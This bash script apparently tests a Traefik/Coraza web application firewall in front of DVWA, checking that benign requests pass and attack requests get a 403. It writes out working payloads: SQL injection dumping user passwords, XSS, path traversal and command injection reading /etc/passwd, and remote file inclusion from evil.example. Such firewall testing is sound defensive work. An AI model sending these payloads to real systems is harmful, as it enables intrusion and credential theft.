#!/usr/bin/env bash
# 03 - Send benign + malicious requests through Traefik/Coraza to DVWA.
# Only run against your own local lab.
HOST="${HOST:-dvwa.localhost}"
BASE="${BASE:-http://localhost}"

pass=0; fail=0
check() { # name expected_class url
  local name="$1" expect="$2" url="$3"
  code=$(curl -s -o /dev/null -w '%{http_code}' -H "Host: $HOST" "$BASE$url")
  if [[ "$expect" == "allow" && "$code" =~ ^(200|301|302)$ ]] || \
     [[ "$expect" == "block" && "$code" == "403" ]]; then
    printf "PASS  %-22s %s -> %s\n" "$name" "$expect" "$code"; ((pass++))
  else
    printf "FAIL  %-22s %s -> %s\n" "$name" "$expect" "$code"; ((fail++))
  fi
}

check "benign-root"        allow "/"
check "benign-login"       allow "/login.php"
check "sqli-or-1=1"        block "/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit"
check "sqli-union"         block "/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit"
check "xss-script"         block "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E"
check "xss-onerror"        block "/vulnerabilities/xss_r/?name=%3Cimg%20src=x%20onerror=alert(1)%3E"
check "path-traversal"     block "/vulnerabilities/fi/?page=../../../../etc/passwd"
check "cmd-injection"      block "/vulnerabilities/exec/?ip=127.0.0.1;cat%20/etc/passwd"
check "rfi"                block "/vulnerabilities/fi/?page=http://evil.example/shell.txt"

# scanner user-agent test
code=$(curl -s -o /dev/null -w '%{http_code}' -H "Host: $HOST" -A "sqlmap/1.7" "$BASE/")
printf "      %-22s block -> %s\n" "scanner-user-agent" "$code"

echo; echo "Passed: $pass  Failed: $fail"
